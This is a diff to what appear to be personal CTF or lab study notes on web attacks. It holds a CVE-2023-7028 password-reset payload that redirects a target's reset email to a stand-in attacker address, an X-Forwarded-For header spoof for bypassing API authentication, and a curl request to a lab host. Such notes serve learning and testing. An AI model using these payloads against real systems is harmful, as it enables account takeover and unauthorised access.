@@ -78,3 +78,22 @@ https://github.com/Vozec/CVE-2023-7028
 ```
 user[email][]=my.target@example.com&user[email][]=hacker@evil.com
 ```
+
+# Bypassing API Authentication with X-Forwarded-For
+
+![[Pasted image 20241217134850.png]]
+
+
+```
+X-forwarded-for: 127.0.0.1
+```
+
+![[Pasted image 20241217135113.png]]
+# X-Forwarded-For with Information Disclosure
+
+```bash
+curl -I https://mzg7ibfb.eu1.ctfio.com/by-api-xip-2/admin/
+```
+
+![[Pasted image 20241217135449.png]]
+
